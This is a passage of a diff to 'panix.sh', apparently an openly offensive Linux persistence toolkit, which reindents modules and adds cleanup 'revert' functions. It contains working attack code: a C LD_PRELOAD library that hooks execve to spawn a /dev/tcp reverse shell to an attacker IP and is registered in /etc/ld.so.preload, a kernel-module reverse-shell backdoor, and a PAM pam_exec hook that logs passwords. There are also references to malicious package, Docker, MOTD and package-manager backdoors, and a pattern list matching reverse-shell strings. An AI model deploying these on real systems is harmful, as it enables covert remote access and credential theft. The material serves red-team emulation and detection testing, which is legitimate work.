+	if [[ -z $ip || -z $port || -z $binary ]]; then
+		echo "Error: --ip, --port, and --binary must be specified."
+		echo "Try './panix.sh --ld-preload --help' for more information."
+		exit 1
+	fi
 
-    # Ensure GCC is installed
-    if ! command -v gcc &>/dev/null; then
-        echo "Error: GCC is not installed. Please install it to proceed."
-        echo "For Debian/Ubuntu: sudo apt install gcc"
-        echo "For Fedora/RHEL/CentOS: sudo dnf install gcc"
-        exit 1
-    fi
+	# Ensure GCC is installed
+	if ! command -v gcc &>/dev/null; then
+		echo "Error: GCC is not installed. Please install it to proceed."
+		echo "For Debian/Ubuntu: sudo apt install gcc build-essential"
+		echo "For Fedora/RHEL/CentOS: sudo dnf install gcc"
+		exit 1
+	fi
 
-    # Ensure the compile directory exists
-    mkdir -p ${preload_compile_dir}
+	# Ensure the compile directory exists
+	mkdir -p ${preload_compile_dir}
 
-    # Generate the C source code for the LD_PRELOAD backdoor
-    cat <<-EOF > ${preload_source}
+	# Generate the C source code for the LD_PRELOAD backdoor
+	cat <<-EOF > ${preload_source}
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
@@ -1536,63 +2159,120 @@ int (*original_execve)(const char *pathname, char *const argv[], char *const env
 
 // Function to spawn a reverse shell in the background
 void spawn_reverse_shell() {
-    pid_t pid = fork();
-    if (pid == 0) { // Child process
-        setsid(); // Start a new session
-        char command[256];
-        sprintf(command, "/bin/bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'", ATTACKER_IP, ATTACKER_PORT);
-        execl("/bin/bash", "bash", "-c", command, NULL);
-        exit(0); // Exit child process if execl fails
-    }
+	pid_t pid = fork();
+	if (pid == 0) { // Child process
+		setsid(); // Start a new session
+		char command[256];
+		sprintf(command, "/bin/bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'", ATTACKER_IP, ATTACKER_PORT);
+		execl("/bin/bash", "bash", "-c", command, NULL);
+		exit(0); // Exit child process if execl fails
+	}
 }
 
 // Hooked execve function
 int execve(const char *pathname, char *const argv[], char *const envp[]) {
-    // Load the original execve function
-    if (!original_execve) {
-        original_execve = dlsym(RTLD_NEXT, "execve");
-        if (!original_execve) {
-            exit(1);
-        }
-    }
+	// Load the original execve function
+	if (!original_execve) {
+		original_execve = dlsym(RTLD_NEXT, "execve");
+		if (!original_execve) {
+			exit(1);
+		}
+	}
 
-    // Check if the executed binary matches the specified binary
-    if (strstr(pathname, "$binary") != NULL) {
-        // Spawn reverse shell in the background
-        spawn_reverse_shell();
-    }
+	// Check if the executed binary matches the specified binary
+	if (strstr(pathname, "$binary") != NULL) {
+		// Spawn reverse shell in the background
+		spawn_reverse_shell();
+	}
 
-    // Call the original execve function
-    return original_execve(pathname, argv, envp);
+	// Call the original execve function
+	return original_execve(pathname, argv, envp);
 }
 EOF
 
-    # Check if the source file was created
-    if [ ! -f "$preload_source" ]; then
-        echo "Failed to create the LD_PRELOAD source code at $preload_source"
-        exit 1
-    else
-        echo "LD_PRELOAD source code created: $preload_source"
-    fi
+	# Check if the source file was created
+	if [ ! -f "$preload_source" ]; then
+		echo "Failed to create the LD_PRELOAD source code at $preload_source"
+		exit 1
+	else
+		echo "LD_PRELOAD source code created: $preload_source"
+	fi
 
-    # Compile the shared object
-    gcc -shared -fPIC -o $preload_lib $preload_source -ldl
-    if [ $? -ne 0 ]; then
-        echo "Compilation failed. Exiting."
-        exit 1
-    fi
+	# Compile the shared object
+	gcc -shared -fPIC -o $preload_lib $preload_source -ldl
+	if [ $? -ne 0 ]; then
+		echo "Compilation failed. Exiting."
+		exit 1
+	fi
 
-    echo "LD_PRELOAD shared object compiled successfully: $preload_lib"
+	echo "LD_PRELOAD shared object compiled successfully: $preload_lib"
 
-    # Add to /etc/ld.so.preload for persistence
-    if ! grep -q "$preload_lib" "$preload_file" 2>/dev/null; then
-        echo $preload_lib >> $preload_file
-        echo "[+] Backdoor added to /etc/ld.so.preload for persistence."
-    else
-        echo "[!] Backdoor already present in /etc/ld.so.preload."
-    fi
+	# Add to /etc/ld.so.preload for persistence
+	if ! grep -q "$preload_lib" "$preload_file" 2>/dev/null; then
+		echo $preload_lib >> $preload_file
+		echo "[+] Backdoor added to /etc/ld.so.preload for persistence."
+	else
+		echo "[!] Backdoor already present in /etc/ld.so.preload."
+	fi
 
-    echo "[+] Execute the binary $binary to trigger the reverse shell."
+	echo "[+] Execute the binary $binary to trigger the reverse shell."
+}
+
+# Revert Module: revert_ld_preload.sh
+revert_ld_preload() {
+	usage_revert_ld_preload() {
+		echo "Usage: ./panix.sh --revert ld-preload"
+		echo "Reverts any changes made by the setup_ld_preload module."
+	}
+
+	# Ensure the function is executed as root
+	if [[ $UID -ne 0 ]]; then
+		echo "Error: This function can only be run as root."
+		return 1
+	fi
+
+	local preload_compile_dir="/tmp/preload"
+	local preload_name="preload_backdoor"
+	local preload_source="${preload_compile_dir}/${preload_name}.c"
+	local preload_lib="/lib/${preload_name}.so"
+	local preload_file="/etc/ld.so.preload"
+
+	# Remove the shared library path from /etc/ld.so.preload
+	if [[ -f "$preload_file" ]]; then
+		if grep -q "$preload_lib" "$preload_file"; then
+			echo "[+] Removing $preload_lib from $preload_file..."
+			sed -i "\|$preload_lib|d" "$preload_file"
+			echo "[+] Removed entry from $preload_file."
+		else
+			echo "[-] $preload_lib not found in $preload_file."
+		fi
+	else
+		echo "[-] $preload_file does not exist."
+	fi
+
+	# Remove the malicious shared library
+	if [[ -f "$preload_lib" ]]; then
+		echo "[+] Removing malicious shared library $preload_lib..."
+		rm -f "$preload_lib"
+		echo "[+] Removed $preload_lib."
+	else
+		echo "[-] Malicious shared library $preload_lib not found."
+	fi
+
+	# Clean up the compile directory
+	if [[ -d "$preload_compile_dir" ]]; then
+		echo "[+] Removing temporary directory $preload_compile_dir..."
+		rm -rf "$preload_compile_dir"
+		echo "[+] Removed $preload_compile_dir."
+	else
+		echo "[-] Temporary directory $preload_compile_dir not found."
+	fi
+
+	echo "[!] Note: The backdoor may still be active in your current session."
+	echo "[!] Please restart your shell session to fully disable the backdoor."
+	echo "[!] Run 'exec bash' to start a new shell session."
+
+	return 0
 }
 
 # Module: setup_lkm.sh
@@ -1622,6 +2302,7 @@ setup_lkm_backdoor() {
 		echo "--custom                     Use custom LKM settings"
 		echo "  --path <path>                Specify custom kernel module path"
 		echo "  --command <command>          Specify custom command to add to LKM"
+		echo "--help|-h                    Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -1669,6 +2350,18 @@ setup_lkm_backdoor() {
 		shift
 	done
 
+	if [[ $default -eq 0 && $custom -eq 0 ]]; then
+		echo "Error: Either --default or --custom must be specified."
+		echo "Try './panix.sh --lkm --help' for more information."
+		exit 1
+	fi
+
+	if [[ $default -eq 1 && $custom -eq 1 ]]; then
+		echo "Error: --default and --custom cannot be specified together."
+		echo "Try './panix.sh --lkm --help' for more information."
+		exit 1
+	fi
+
 	if ! command -v make &> /dev/null; then
 		echo "Error: 'make' is not installed. Please install 'make' or 'build-essential' to use this mechanism."
 		echo "For Debian/Ubuntu: sudo apt install build-essential"
@@ -1693,18 +2386,6 @@ setup_lkm_backdoor() {
 		exit 1
 	fi
 
-	if [[ $default -eq 1 && $custom -eq 1 ]]; then
-		echo "Error: --default and --custom cannot be specified together."
-		echo "Try './panix.sh --lkm --help' for more information."
-		exit 1
-	fi
-
-	if [[ $default -eq 0 && $custom -eq 0 ]]; then
-		echo "Error: Either --default or --custom must be specified."
-		echo "Try './panix.sh --lkm --help' for more information."
-		exit 1
-	fi
-
 	if [[ $default -eq 1 ]]; then
 		if [[ -z $ip || -z $port ]]; then
 			echo "Error: --ip and --port must be specified when using --default."
@@ -1715,7 +2396,6 @@ setup_lkm_backdoor() {
 		# Populate the command for default mode
 		# Ensure proper escaping for C string
 		command="\"/bin/bash\",\"-c\",\"/bin/nohup /bin/setsid /bin/bash -c '/bin/bash -i >& /dev/tcp/$ip/$port 0>&1'\",NULL"
-		echo "Default mode selected. Command set to reverse shell."
 
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $command || -z $lkm_path ]]; then
@@ -1728,8 +2408,10 @@ setup_lkm_backdoor() {
 		# Ensure proper escaping for C string
 		command="\"/bin/bash\",\"-c\",\"$command\",NULL"
 		lkm_destination="$lkm_path"
-		echo "Custom mode selected. Command set to user-provided command."
+        mkdir -p $(dirname $lkm_destination)
 	fi
+
+    mkdir -p ${lkm_compile_dir}
 
 	cat <<-EOF > ${lkm_source}
 	#include <linux/module.h>
@@ -1828,6 +2510,70 @@ EOF
 	echo "[+] LKM backdoor established!"
 }
 
+# Revert Module: revert_lkm.sh
+revert_lkm() {
+	usage_revert_lkm() {
+		echo "Usage: ./panix.sh --revert lkm"
+		echo "Reverts any changes made by the setup_lkm_backdoor module."
+	}
+
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		return 1
+	fi
+
+	local lkm_name="panix"
+	local lkm_compile_dir="/tmp/lkm"
+	local lkm_destination="/lib/modules/$(uname -r)/kernel/drivers/${lkm_name}.ko"
+	local lkm_module_name="${lkm_name}"
+
+	# Unload the kernel module if it is loaded
+	if lsmod | grep -q "^${lkm_module_name} "; then
+		echo "[+] Unloading kernel module '${lkm_module_name}'..."
+		rmmod "${lkm_module_name}"
+		if [[ $? -eq 0 ]]; then
+			echo "[+] Kernel module '${lkm_module_name}' unloaded successfully."
+		else
+			echo "[-] Failed to unload kernel module '${lkm_module_name}'."
+		fi
+	else
+		echo "[-] Kernel module '${lkm_module_name}' is not loaded."
+	fi
+
+	# Remove the kernel module file
+	if [[ -f "${lkm_destination}" ]]; then
+		echo "[+] Removing kernel module file '${lkm_destination}'..."
+		rm -f "${lkm_destination}"
+		if [[ $? -eq 0 ]]; then
+			echo "[+] Kernel module file '${lkm_destination}' removed successfully."
+		else
+			echo "[-] Failed to remove kernel module file '${lkm_destination}'."
+		fi
+	else
+		echo "[-] Kernel module file '${lkm_destination}' not found."
+	fi
+
+	# Clean up the compile directory
+	if [[ -d "${lkm_compile_dir}" ]]; then
+		echo "[+] Removing temporary directory '${lkm_compile_dir}'..."
+		rm -rf "${lkm_compile_dir}"
+		if [[ $? -eq 0 ]]; then
+			echo "[+] Temporary directory '${lkm_compile_dir}' removed successfully."
+		else
+			echo "[-] Failed to remove temporary directory '${lkm_compile_dir}'."
+		fi
+	else
+		echo "[-] Temporary directory '${lkm_compile_dir}' not found."
+	fi
+
+	# Update module dependencies
+	echo "[+] Updating module dependencies..."
+	depmod -a
+	echo "[+] Module dependencies updated."
+
+	return 0
+}
+
 # Module: setup_malicious_docker_container.sh
 setup_malicious_docker_container() {
 	local ip=""
@@ -1843,6 +2589,7 @@ setup_malicious_docker_container() {
 		echo "--examples                   Display command examples"
 		echo "--ip <ip>                    Specify IP address"
 		echo "--port <port>                Specify port number"
+		echo "--help|-h                    Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -1916,6 +2663,51 @@ setup_malicious_docker_container() {
 	echo "[+] Docker container persistence established!" 
 }
 
+# Revert Module: revert_malicious_docker_container.sh
+revert_malicious_container() {
+	usage_revert_malicious_container() {
+		echo "Usage: ./panix.sh --revert malicious-container"
+		echo "Reverts any changes made by the setup_malicious_docker_container module."
+	}
+
+	# Check if Docker is available
+	if ! docker ps &> /dev/null; then
+		echo "Error: Docker daemon is not running or permission denied."
+		return 1
+	fi
+
+	# Stop and remove the malicious container
+	if docker ps -a --format '{{.Names}}' | grep -q '^malicious-container$'; then
+		echo "[+] Stopping and removing the 'malicious-container'..."
+		docker stop malicious-container >/dev/null 2>&1
+		docker rm malicious-container >/dev/null 2>&1
+		echo "[+] Container 'malicious-container' stopped and removed."
+	else
+		echo "[-] Container 'malicious-container' not found. No action needed."
+	fi
+
+	# Remove the Docker image
+	if docker images -q malicious-container > /dev/null 2>&1; then
+		echo "[+] Removing Docker image 'malicious-container'..."
+		docker rmi malicious-container -f >/dev/null 2>&1
+		echo "[+] Docker image 'malicious-container' removed."
+	else
+		echo "[-] Docker image 'malicious-container' not found. No action needed."
+	fi
+
+	# Remove the Dockerfile
+	DOCKERFILE="/tmp/Dockerfile"
+	if [[ -f "$DOCKERFILE" ]]; then
+		echo "[+] Removing Dockerfile at $DOCKERFILE..."
+		rm -f "$DOCKERFILE"
+		echo "[+] Dockerfile removed."
+	else
+		echo "[-] Dockerfile at $DOCKERFILE not found. No action needed."
+	fi
+
+	return 0
+}
+
 # Module: setup_malicious_package.sh
 setup_malicious_package() {
 	local ip=""
@@ -1936,6 +2728,7 @@ setup_malicious_package() {
 		echo "--port <port>         Specify port number"
 		echo "--rpm                 Use RPM package manager"
 		echo "--dpkg                Use DPKG package manager"
+		echo "--help|-h             Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -2089,6 +2882,101 @@ setup_malicious_package() {
 	echo "[+] Malicious package persistence established."
 }
 
+# Revert Module: revert_malicious_package.sh
+revert_malicious_package() {
+    usage_revert_malicious_package() {
+        echo "Usage: ./panix.sh --revert malicious-package"
+        echo "Reverts any changes made by the setup_malicious_package module."
+    }
+
+    echo "[+] Reverting malicious package..."
+
+    if ! check_root; then
+        echo "Error: This function can only be run as root."
+        return 1
+    fi
+
+    local mechanism=""
+    local PACKAGE_NAME="panix"
+
+    # Detect if RPM or DPKG was used
+    if command -v rpm &> /dev/null && rpm -qa | grep -q "^${PACKAGE_NAME}"; then
+        mechanism="rpm"
+    elif command -v dpkg &> /dev/null && dpkg -l | grep -q "^ii  ${PACKAGE_NAME} "; then
+        mechanism="dpkg"
+    else
+        echo "[-] Malicious package '${PACKAGE_NAME}' not found via RPM or DPKG. No action needed."
+    fi
+
+    if [[ "$mechanism" == "rpm" ]]; then
+        echo "[+] Removing RPM package '${PACKAGE_NAME}'..."
+        rpm -e --noscripts "${PACKAGE_NAME}"
+        if [[ $? -eq 0 ]]; then
+            echo "[+] RPM package '${PACKAGE_NAME}' removed successfully."
+        else
+            echo "[-] Failed to remove RPM package '${PACKAGE_NAME}'."
+        fi
+
+        # Remove the RPM file from /var/lib/rpm
+        if [[ -f "/var/lib/rpm/${PACKAGE_NAME}.rpm" ]]; then
+            echo "[+] Removing RPM file '/var/lib/rpm/${PACKAGE_NAME}.rpm'..."
+            rm -f "/var/lib/rpm/${PACKAGE_NAME}.rpm"
+            echo "[+] RPM file removed."
+        else
+            echo "[-] RPM file '/var/lib/rpm/${PACKAGE_NAME}.rpm' not found."
+        fi
+
+    elif [[ "$mechanism" == "dpkg" ]]; then
+        echo "[+] Removing DPKG package '${PACKAGE_NAME}'..."
+        dpkg --purge "${PACKAGE_NAME}"
+        if [[ $? -eq 0 ]]; then
+            echo "[+] DPKG package '${PACKAGE_NAME}' removed successfully."
+        else
+            echo "[-] Failed to remove DPKG package '${PACKAGE_NAME}'."
+        fi
+    fi
+
+    # Remove the cron job added by the setup function
+    echo "[+] Removing cron job associated with '${PACKAGE_NAME}'..."
+    # Create a temporary file to store the current crontab
+    crontab -l > /tmp/current_cron$$ 2>/dev/null
+    if [[ $? -ne 0 ]]; then
+        echo "[-] No crontab for user $(whoami). No action needed."
+        rm -f /tmp/current_cron$$
+    else
+        # Remove lines containing the malicious package commands
+        grep -v ".*${PACKAGE_NAME}.*" /tmp/current_cron$$ > /tmp/new_cron$$
+        # Install the new crontab
+        crontab /tmp/new_cron$$
+        echo "[+] Cron job removed."
+        # Clean up temporary files
+        rm -f /tmp/current_cron$$ /tmp/new_cron$$
+    fi
+
+    # Clean up any remaining build directories (RPM)
+    if [[ -d "~/rpmbuild" ]]; then
+        echo "[+] Removing RPM build directory '~/rpmbuild'..."
+        rm -rf ~/rpmbuild
+        echo "[+] RPM build directory removed."
+    fi
+
+    # Clean up any remaining package directories (DPKG)
+    if [[ -d "${PACKAGE_NAME}" ]]; then
+        echo "[+] Removing package directory '${PACKAGE_NAME}'..."
+        rm -rf "${PACKAGE_NAME}"
+        echo "[+] Package directory removed."
+    fi
+
+    # Remove any lingering files in /var/lib/dpkg/info (DPKG)
+    if [[ -d "/var/lib/dpkg/info" ]]; then
+        echo "[+] Cleaning up '/var/lib/dpkg/info'..."
+        rm -f "/var/lib/dpkg/info/${PACKAGE_NAME}."*
+        echo "[+] Cleanup completed."
+    fi
+
+    return 0
+}
+
 # Module: setup_motd_backdoor.sh
 setup_motd_backdoor() {
 	local default=0
@@ -2112,6 +3000,7 @@ setup_motd_backdoor() {
 		echo "--custom                     Use custom MOTD settings"
 		echo "  --command <command>          Specify custom command"
 		echo "  --path <path>                Specify custom MOTD file path in /etc/update-motd.d/"
+		echo "--help|-h                    Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -2204,6 +3093,81 @@ setup_motd_backdoor() {
 	fi
 }
 
+# Revert Module: revert_motd_backdoor.sh
+revert_motd() {
+	usage_revert_motd() {
+		echo "Usage: ./panix.sh --revert motd"
+		echo "Reverts any changes made by the setup_motd_backdoor module."
+	}
+
+	# Ensure the function is run as root
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		return 1
+	fi
+
+	# Function to remove a file if it exists
+	remove_file() {
+		local file_path="$1"
+		if [[ -f "$file_path" ]]; then
+			rm -f "$file_path"
+			echo "[+] Removed file: $file_path"
+		else
+			echo "[-] File not found: $file_path"
+		fi
+	}
+
+	# Function to remove a MOTD backdoor script if it contains malicious commands
+	remove_motd_script() {
+		local script_path="$1"
+		# Define patterns that indicate a reverse shell
+		local patterns=("bash -i >& /dev/tcp" "nohup setsid /bin/sh " "bash -c 'sh -i" "setsid nohup")
+		
+		for pattern in "${patterns[@]}"; do
+			if grep -q "$pattern" "$script_path"; then
+				echo "[+] Identified malicious MOTD script: $script_path"
+				remove_file "$script_path"
+				return
+			fi
+		done
+	}
+
+	# Remove default MOTD backdoor script
+	default_motd_path="/etc/update-motd.d/137-python-upgrades"
+	echo "[+] Removing default MOTD backdoor script..."
+	
+	if [[ -f "$default_motd_path" ]]; then
+		remove_motd_script "$default_motd_path"
+	fi
+
+	# Search and remove custom MOTD backdoor scripts
+	echo "[+] Searching for custom MOTD backdoor scripts in /etc/update-motd.d/..."
+	for motd_script in /etc/update-motd.d/*; do
+		# Ensure it's a regular file
+		if [[ ! -f "$motd_script" ]]; then
+			continue
+		fi
+
+		# Exclude default scripts based on naming convention (e.g., 00-header, 10-help-text)
+		script_basename=$(basename "$motd_script")
+		if [[ "$script_basename" =~ ^[0-9]{2,3}- ]]; then
+			# Check for malicious patterns
+			remove_motd_script "$motd_script"
+		fi
+	done
+
+	# Reload MOTD to apply changes
+	echo "[+] Reloading MOTD rules..."
+	if command -v run-parts &>/dev/null; then
+		run-parts /etc/update-motd.d/ &> /dev/null
+		echo "[+] MOTD rules reloaded using run-parts."
+	else
+		echo "[-] run-parts command not found. Skipping MOTD reload."
+	fi
+
+	return 0
+}
+
 # Module: setup_package_manager_persistence.sh
 setup_package_manager_persistence() {
 	local ip=""
@@ -2221,6 +3185,7 @@ setup_package_manager_persistence() {
 		echo "--ip <ip>                    Specify IP address"
 		echo "--port <port>                Specify port number"
 		echo "--apt | --yum | --dnf        Use APT, YUM or DNF package manager"
+		echo "--help|-h                    Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -2323,6 +3288,85 @@ setup_package_manager_persistence() {
 	echo "[+] Package manager persistence established!"
 }
 
+# Revert Module: revert_package_manager_persistence.sh
+revert_package_manager() {
+	usage_revert_package_manager() {
+		echo "Usage: ./panix.sh --revert package-manager"
+		echo "Reverts any changes made by the setup_package_manager_persistence module."
+	}
+
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		return 1
+	fi
+
+	# Revert APT persistence
+	if [[ -f "/etc/apt/apt.conf.d/01python-upgrades" ]]; then
+		echo "[+] Removing malicious APT configuration..."
+		rm -f "/etc/apt/apt.conf.d/01python-upgrades"
+		echo "[+] Malicious APT configuration removed."
+	else
+		echo "[-] Malicious APT configuration not found."
+	fi
+
+	# Revert YUM persistence
+	if [[ -f "/usr/lib/yumcon" ]] || [[ -f "/usr/lib/yum-plugins/yumcon.py" ]] || [[ -f "/etc/yum/pluginconf.d/yumcon.conf" ]]; then
+		echo "[+] Removing malicious YUM configurations and scripts..."
+
+		# Remove the malicious script
+		if [[ -f "/usr/lib/yumcon" ]]; then
+			rm -f "/usr/lib/yumcon"
+			echo "[+] Removed /usr/lib/yumcon."
+		fi
+
+		# Remove the YUM plugin
+		if [[ -f "/usr/lib/yum-plugins/yumcon.py" ]]; then
+			rm -f "/usr/lib/yum-plugins/yumcon.py"
+			echo "[+] Removed /usr/lib/yum-plugins/yumcon.py."
+		fi
+
+		# Remove the plugin configuration
+		if [[ -f "/etc/yum/pluginconf.d/yumcon.conf" ]]; then
+			rm -f "/etc/yum/pluginconf.d/yumcon.conf"
+			echo "[+] Removed /etc/yum/pluginconf.d/yumcon.conf."
+		fi
+
+		echo "[+] Malicious YUM configurations and scripts removed."
+	else
+		echo "[-] Malicious YUM configurations and scripts not found."
+	fi
+
+	# Revert DNF persistence
+	python_version=$(ls /usr/lib | grep -oP 'python3\.\d+' | head -n 1)
+	if [[ -f "/usr/lib/${python_version}/site-packages/dnfcon" ]] || [[ -f "/usr/lib/${python_version}/site-packages/dnf-plugins/dnfcon.py" ]] || [[ -f "/etc/dnf/plugins/dnfcon.conf" ]]; then
+		echo "[+] Removing malicious DNF configurations and scripts..."
+
+		# Remove the malicious script
+		if [[ -f "/usr/lib/${python_version}/site-packages/dnfcon" ]]; then
+			rm -f "/usr/lib/${python_version}/site-packages/dnfcon"
+			echo "[+] Removed /usr/lib/${python_version}/site-packages/dnfcon."
+		fi
+
+		# Remove the DNF plugin
+		if [[ -f "/usr/lib/${python_version}/site-packages/dnf-plugins/dnfcon.py" ]]; then
+			rm -f "/usr/lib/${python_version}/site-packages/dnf-plugins/dnfcon.py"
+			echo "[+] Removed /usr/lib/${python_version}/site-packages/dnf-plugins/dnfcon.py."
+		fi
+
+		# Remove the plugin configuration
+		if [[ -f "/etc/dnf/plugins/dnfcon.conf" ]]; then
+			rm -f "/etc/dnf/plugins/dnfcon.conf"
+			echo "[+] Removed /etc/dnf/plugins/dnfcon.conf."
+		fi
+
+		echo "[+] Malicious DNF configurations and scripts removed."
+	else
+		echo "[-] Malicious DNF configurations and scripts not found."
+	fi
+
+	return 0
+}
+
 # Module: setup_pam.sh
 setup_pam_persistence() {
 	local pam_version=""
@@ -2332,6 +3376,7 @@ setup_pam_persistence() {
 	local backdoor=""
 	local ip=""
 	local port=""
+	local path=""
 
 	if [[ $EUID -ne 0 ]]; then
 		echo "[-] This function can only be run as root."
@@ -2348,6 +3393,7 @@ setup_pam_persistence() {
 		echo "  --backdoor                   Inject reverse shell backdoor"
 		echo "    --ip <ip>                    Specify IP address"
 		echo "    --port <port>                Specify port number"
+		echo "--help|-h                    Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -2420,6 +3466,9 @@ setup_pam_persistence() {
 	case $mechanism in
 		# Inspired by: https://github.com/zephrax/linux-pam-backdoor
 		--module )
+			echo "[!] This module is tricky.. It may not work on all systems."
+			echo "[!] Tested on: Debian 11, CentOS Stream 9 & RHEL 9.4"
+			echo "[!] For older versions of PAM, the source may not be available anymore."
 			echo "[+] Determining PAM version..."
 			if [ -f /etc/os-release ]; then
 				. /etc/os-release
@@ -2490,6 +3539,7 @@ setup_pam_persistence() {
 				fi
 			else
 				echo "[-] Download failed: TAR file not found."
+				echo "[-] Please check the PAM version and download the source manually (if still available) from: $dl_url"
 				exit 1
 			fi
 
@@ -2508,9 +3558,21 @@ setup_pam_persistence() {
 			cd "$src_dir" || exit
 			if [ ! -f "./configure" ]; then
 				./autogen.sh
+				if [ $? -ne 0 ]; then
+					echo "[-] autogen.sh failed."
+					exit 1
+				fi
 			fi
 			./configure > /dev/null 2>&1
+			if [ $? -ne 0 ]; then
+				echo "[-] Configuration failed."
+				exit 1
+			fi
 			make -j"$(nproc)" > /dev/null 2>&1
+			if [ $? -ne 0 ]; then
+				echo "[-] Compilation failed during make."
+				exit 1
+			fi
 
 			if [ ! -f "modules/pam_unix/.libs/pam_unix.so" ]; then
 				echo "[-] Compilation failed: PAM library not created."
@@ -2562,6 +3624,26 @@ setup_pam_persistence() {
 			# Technique used from: https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/
 			if [[ $log -eq 1 ]]; then
 
+				if [[ -f /etc/os-release ]]; then
+					# Source the os-release file to get OS details
+					. /etc/os-release
+					os_id=${ID_LIKE:-$ID}  # Use ID_LIKE if available, otherwise use ID
+
+					if [[ "$os_id" == *"debian"* ]]; then
+						path="/etc/pam.d/common-auth"
+						echo "[+] Detected Debian/Ubuntu-based system. Path set to: $path"
+					elif [[ "$os_id" == *"rhel"* || "$os_id" == *"fedora"* || "$os_id" == *"centos"* ]]; then
+						path="/etc/pam.d/sshd"
+						echo "[+] Detected Red Hat/CentOS/Fedora-based system. Path set to: $path"
+					else
+						echo "[-] Unsupported OS detected: $os_id"
+						exit 1
+					fi
+				else
+					echo "[-] Error: Unable to detect the operating system. /etc/os-release not found."
+					exit 1
+				fi
+
 				# Step 1: Create the script /var/log/spy.sh
 				echo "[+] Creating /var/log/spy.sh..."
 
@@ -2598,19 +3680,19 @@ setup_pam_persistence() {
 					exit 1
 				fi
 
-				# Step 3: Append line to /etc/pam.d/common-auth
-				echo "[+] Modifying /etc/pam.d/common-auth..."
+				# Step 3: Append line to /etc/pam.d/
+				echo "[+] Modifying $path"
 
 				pam_line='auth optional pam_exec.so quiet expose_authtok /var/log/spy.sh'
 
-				if grep -Fxq "$pam_line" /etc/pam.d/common-auth; then
-					echo "[+] The line is already present in /etc/pam.d/common-auth."
+				if grep -Fxq "$pam_line" "$path"; then
+					echo "[+] The line is already present in $path."
 				else
-					echo "$pam_line" >> /etc/pam.d/common-auth
+					echo "$pam_line" >> "$path"
 					if [[ $? -eq 0 ]]; then
-						echo "[+] Line added to /etc/pam.d/common-auth."
+						echo "[+] Line added to $path."
 					else
-						echo "[-] Failed to modify /etc/pam.d/common-auth."
+						echo "[-] Failed to modify $path."
 						exit 1
 					fi
 				fi
@@ -2675,6 +3757,183 @@ setup_pam_persistence() {
 	echo "[+] PAM persistence established!"
 }
 
+# Revert Module: revert_pam.sh
+revert_pam() {
+	usage_revert_pam() {
+		echo "Usage: ./panix.sh --revert pam"
+		echo "Reverts any changes made by the setup_pam_persistence module."
+	}
+
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		return 1
+	fi
+
+	# Function to restore the original pam_unix.so module
+	restore_pam_module() {
+		echo "[+] Restoring original PAM module..."
+
+		# Detect the Linux distribution and package manager
+		if [ -f /etc/os-release ]; then
+			. /etc/os-release
+			linux_distro=${ID_LIKE:-$ID}
+		else
+			linux_distro=$(uname -s | tr '[:upper:]' '[:lower:]')
+		fi
+
+		case "$linux_distro" in
+			*ubuntu*|*debian*|*mint*|*kali*)
+				echo "[+] Detected Debian-based distribution."
+				echo "[+] Reinstalling 'libpam-modules' package..."
+				apt-get update >/dev/null 2>&1
+				apt-get install --reinstall -y libpam-modules >/dev/null 2>&1
+				if [[ $? -eq 0 ]]; then
+					echo "[+] 'libpam-modules' reinstalled successfully."
+				else
+					echo "[-] Failed to reinstall 'libpam-modules'."
+				fi
+				;;
+			*rhel*|*centos*|*fedora*)
+				echo "[+] Detected RPM-based distribution."
+				echo "[+] Reinstalling 'pam' package..."
+				if command -v yum &>/dev/null; then
+					yum reinstall -y pam >/dev/null 2>&1
+				elif command -v dnf &>/dev/null; then
+					dnf reinstall -y pam >/dev/null 2>&1
+				else
+					echo "[-] Neither 'yum' nor 'dnf' package manager found."
+					return 1
+				fi
+				if [[ $? -eq 0 ]]; then
+					echo "[+] 'pam' reinstalled successfully."
+				else
+					echo "[-] Failed to reinstall 'pam'."
+				fi
+				;;
+			*)
+				echo "[-] Unsupported distribution: $linux_distro"
+				return 1
+				;;
+		esac
+	}
+
+	# Function to remove malicious PAM_EXEC configurations and scripts
+	remove_pam_exec_backdoor() {
+		echo "[+] Removing PAM_EXEC backdoor..."
+
+		# Remove the reverse shell script
+		if [[ -f "/bin/pam_exec_backdoor.sh" ]]; then
+			rm -f "/bin/pam_exec_backdoor.sh"
+			if [[ $? -eq 0 ]]; then
+				echo "[+] Removed '/bin/pam_exec_backdoor.sh'."
+			else
+				echo "[-] Failed to remove '/bin/pam_exec_backdoor.sh'."
+			fi
+		else
+			echo "[-] '/bin/pam_exec_backdoor.sh' not found."
+		fi
+
+		# Remove the PAM_EXEC line from /etc/pam.d/sshd
+		pam_sshd_file="/etc/pam.d/sshd"
+		pam_line="session    optional     pam_exec.so seteuid /bin/pam_exec_backdoor.sh"
+		if grep -Fxq "$pam_line" "$pam_sshd_file"; then
+			sed -i "\|$pam_line|d" "$pam_sshd_file"
+			echo "[+] Removed PAM_EXEC line from '$pam_sshd_file'."
+		else
+			echo "[-] PAM_EXEC line not found in '$pam_sshd_file'."
+		fi
+
+		# Restart SSH service
+		echo "[+] Restarting SSH service..."
+		if systemctl restart sshd; then
+			echo "[+] SSH service restarted successfully."
+		else
+			echo "[-] Failed to restart SSH service."
+		fi
+	}
+
+	# Function to remove PAM_EXEC logging backdoor
+	remove_pam_exec_logging() {
+		echo "[+] Removing PAM_EXEC logging backdoor..."
+
+		# Remove the spy script
+		if [[ -f "/var/log/spy.sh" ]]; then
+			rm -f "/var/log/spy.sh"
+			if [[ $? -eq 0 ]]; then
+				echo "[+] Removed '/var/log/spy.sh'."
+			else
+				echo "[-] Failed to remove '/var/log/spy.sh'."
+			fi
+		else
+			echo "[-] '/var/log/spy.sh' not found."
+		fi
+
+		# Remove the log file
+		if [[ -f "/var/log/panix.log" ]]; then
+			rm -f "/var/log/panix.log"
